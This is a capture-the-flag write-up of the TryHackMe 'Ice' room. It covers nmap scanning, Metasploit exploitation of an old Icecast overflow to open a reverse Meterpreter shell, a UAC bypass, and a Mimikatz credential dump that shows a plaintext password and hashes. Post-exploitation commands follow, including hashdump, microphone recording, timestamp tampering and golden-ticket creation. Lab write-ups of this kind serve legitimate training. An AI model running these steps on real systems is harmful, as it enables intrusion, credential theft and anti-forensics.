#Ice
```
Joe Vinyard | 20200609
```
#IP Address
```
export IP=10.10.159.191
```

##Nmap scan 
```
# Nmap 7.80 scan initiated Tue Jun  9 18:07:18 2020 as: nmap -sS -sV -sC -p- -oN nmap/initial 10.10.159.191
Nmap scan report for 10.10.159.191
Host is up (0.22s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:89:04:c8:6e:88 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-09T17:31:49-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-09T22:31:49
|_  start_date: 2020-06-09T22:07:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  9 18:32:54 2020 -- 1 IP address (1 host up) scanned in 1536.03 seconds

```

#Task 1 Connect

Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

1. No answer needed
2. No answer needed
3. No answer needed
4. No answer needed

#Task 2 Recon

Scan and enumerate our victim!

1. No answer needed

2. No answer needed

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
```
3389
```

4. What service did nmap identify as running on port 8000? (First word of this service)
```
Icecast
```

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)
```
DARK-PC
```

#Task 3 Gain Access

Exploit the target vulnerable service to gain a foothold!

1. Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
```
execute code overflow
```
2. 	What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
```
CVE-2004-1561
```

3. No answer needed

4. After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
```
exploit/windows/http/icecast_header
```
5. No answer needed
```
msf5 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


msf5 > use 0
msf5 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.159.191
RHOSTS => 10.10.159.191
msf5 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 10.2.13.68:4444 
[*] Sending stage (176195 bytes) to 10.10.159.191
[*] Meterpreter session 1 opened (10.2.13.68:4444 -> 10.10.159.191:49233) at 2020-06-09 19:00:52 -0400

meterpreter > 
```
6.  Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank? 
```
RHOSTS
```
7. No answer needed

# Task 4 Escalate

Enumerate the machine and find potential privilege escalation paths to gain Admin powers!


1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
```
meterpreter
```

2. What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room. 
```
Dark
```
3. What build of Windows is the system?
```
7601
```
4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
```
x64
```
5. No answer needed

6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
```
exploit/windows/local/bypassuac_eventvwr



msf5 exploit(windows/http/icecast_header) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(windows/http/icecast_header) > use 0
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.159.191 - Collecting local exploits for x86/windows...
[*] 10.10.159.191 - 31 exploit checks are being tried...
[+] 10.10.159.191 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.159.191 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

7. No answer needed

8. No answer needed

9. No answer needed

10. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`
```
LHOST
```

11. No answer needed
12. No answer needed
13. No answer needed


Originally had an issue executing the local bypassuac payload as I was setting the wrong LHOST, or rather, setting it the wrong way.

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_eventvwr 


msf5 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf5 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1

msf5 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.2.13.68
LHOST => 10.2.13.68
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 192.168.1.198:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Cleaning up registry keys ...
[*] Exploit completed, but no session was created.
```
After a cursory search, I found that I was actually supposed to specify "tun0" when setting the LHOST.  
```
msf5 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.2.13.68:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (176195 bytes) to 10.10.214.158
[*] Meterpreter session 2 opened (10.2.13.68:4444 -> 10.10.214.158:49201) at 2020-06-10 05:42:53 -0400
```

14. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
```
SeTakeOwnershipPrivilege	
```

#Task 5 Looting

Learn how to gather additional credentials and crack the saved hashes on the machine.

1. No answer needed

2. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
```
spoolsv.exe
```

3. No answer needed
```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2672 to 1364...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

4. Let's check what user we are now with the command `getuid`. What user is listed?
```
NT AUTHORITY\SYSTEM
```

5. No answer needed

6. No answer needed 

7. Which command allows up to retrieve all credentials?
```
creds_all
```
8. Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

#Task 6 Post-Exploitation

Explore post-exploitation actions we can take on Windows.

1. No answer needed

2. What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
```
hashdump
```
3. While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
```
screenshare
```
4.  How about if we wanted to record from a microphone attached to the system? 
```
record_mic
```

5. To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
```
timestomp
```

6. Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
```
golden_ticket_create
```

7. No answer needed

#Task 7 Extra Credit

To learn more about alternative exploitation methods, check out the sequel to this room Blaster!

1. No answer needed

As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.
